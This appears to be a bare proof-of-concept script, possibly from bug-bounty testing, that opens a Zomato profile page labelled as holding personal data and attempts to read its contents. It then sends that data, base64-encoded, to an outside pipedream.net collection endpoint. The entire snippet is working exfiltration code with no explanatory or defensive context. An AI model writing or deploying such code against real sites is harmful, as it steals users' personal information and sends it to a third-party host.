<script>
    // 1. Open the PII page
    var piiWindow = window.open("https://www.zomato.com/webroutes/getPage?page_url=/profile", "_blank");
    
    // 2. Try to read it after it loads
    setTimeout(function() {
        try {
            // If the JSON is raw, it's often inside a <pre> or <body>
            var data = piiWindow.document.body.innerText;
            fetch('https://eomfuajl79ed6za.m.pipedream.net/?exfil=' + btoa(data));
        } catch (e) {
            fetch('https://eomfuajl79ed6za.m.pipedream.net/?error=' + btoa(e.message));
        }
    }, 4000);
</script>
